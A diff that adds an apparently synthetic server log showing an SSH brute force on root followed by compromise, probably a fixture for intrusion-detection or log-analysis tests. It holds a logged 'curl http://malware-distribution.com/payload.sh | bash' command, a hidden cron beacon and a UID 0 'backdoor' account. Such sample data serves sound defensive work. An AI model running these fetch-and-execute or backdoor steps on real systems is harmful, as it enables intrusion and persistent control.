@@ -1,0 +1,20 @@
+Mar  5 08:23:41 webserver01 sshd[12345]: Failed password for root from 185.220.101.1 port 44123 ssh2
+Mar  5 08:23:42 webserver01 sshd[12345]: Failed password for root from 185.220.101.1 port 44123 ssh2
+Mar  5 08:23:43 webserver01 sshd[12345]: Failed password for root from 185.220.101.1 port 44123 ssh2
+Mar  5 08:23:44 webserver01 sshd[12345]: Failed password for root from 185.220.101.1 port 44123 ssh2
+Mar  5 08:23:45 webserver01 sshd[12345]: Failed password for root from 185.220.101.1 port 44123 ssh2
+Mar  5 08:23:46 webserver01 sshd[12345]: Failed password for admin from 185.220.101.1 port 44123 ssh2
+Mar  5 08:23:47 webserver01 sshd[12345]: Failed password for admin from 185.220.101.1 port 44123 ssh2
+Mar  5 08:24:01 webserver01 sshd[12345]: Accepted password for root from 185.220.101.1 port 44123 ssh2
+Mar  5 08:24:02 webserver01 sshd[12345]: pam_unix(sshd:session): session opened for user root
+Mar  5 08:24:15 webserver01 sudo: attacker : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl http://malware-distribution.com/payload.sh | bash
+Mar  5 08:25:00 webserver01 crontab[9876]: (root) REPLACE (root)
+Mar  5 08:25:01 webserver01 CRON[9877]: (root) CMD (/tmp/.hidden/beacon.sh)
+Mar  5 08:30:12 webserver01 useradd[4567]: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash
+Mar  5 09:00:00 webserver01 sshd[22345]: reverse tunneling enabled from 10.0.0.5 port 8080
+Mar  5 09:15:00 webserver01 kernel: [12345.678901] segfault at 0000000000000000 ip 00007f1234567890
+Mar  5 09:30:00 dbserver01 sshd[33456]: Failed password for postgres from 192.168.1.50 port 55555 ssh2
+Mar  5 10:00:00 webserver01 sshd[11111]: Accepted password for deploy from 10.0.0.100 port 22 ssh2
+Mar  5 10:00:01 webserver01 sshd[11111]: pam_unix(sshd:session): session opened for user deploy
+Mar  5 11:00:00 webserver01 UFW BLOCK IN=eth0 SRC=45.33.32.156 DST=10.0.0.1 PROTO=TCP DPT=445
+Mar  5 11:00:01 webserver01 UFW BLOCK IN=eth0 SRC=45.33.32.156 DST=10.0.0.1 PROTO=TCP DPT=3389
